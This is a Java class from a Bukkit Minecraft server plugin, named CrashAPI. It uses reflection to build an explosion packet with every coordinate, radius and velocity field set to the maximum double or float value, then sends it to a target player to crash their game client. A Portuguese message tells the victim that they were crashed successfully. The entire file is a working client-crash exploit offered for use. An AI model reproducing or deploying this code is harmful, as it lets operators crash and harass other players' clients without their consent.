package Outfit.PvP.Commands;


import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.List;

import org.bukkit.entity.Player;

import Outfit.PvP.Main.Main;
import net.md_5.bungee.api.ChatColor;


public class CrashAPI {

	private static Object packet;

	public static void crashPlayer(Player player) {
		try {
			ReflectionUtils.sendPacket(player, packet);
			player.sendMessage(ChatColor.BLUE + "Você foi crashado com sucesso!");
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

	public static void load() {
		try 
		{
			Object Vec3D;
			Class<?> explosionClass;
			Class<?> vectorClass = ReflectionUtils.getNMSClass("Vec3D");

			if (Main.isVeryOldVersion()) {
				explosionClass = ReflectionUtils.getNMSClass("Packet60Explosion");
			} else {
				explosionClass = ReflectionUtils.getNMSClass("PacketPlayOutExplosion");
			}

			if (Main.isOldVersion()) {
				Method Vector3dConstructor = vectorClass.getMethod("a", double.class, double.class, double.class);
				Vec3D = Vector3dConstructor.invoke(null, Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
			} else {
				Constructor<?> Vector3dConstructor = vectorClass.getConstructor(double.class, double.class,	double.class);
				Vec3D = Vector3dConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
			}

			Constructor<?> explosionConstructor = explosionClass.getConstructor(double.class, double.class,	double.class, float.class, List.class, vectorClass);
			packet = explosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,	Float.MAX_VALUE, Collections.emptyList(), Vec3D);
		} catch (Throwable e) {}
	}
}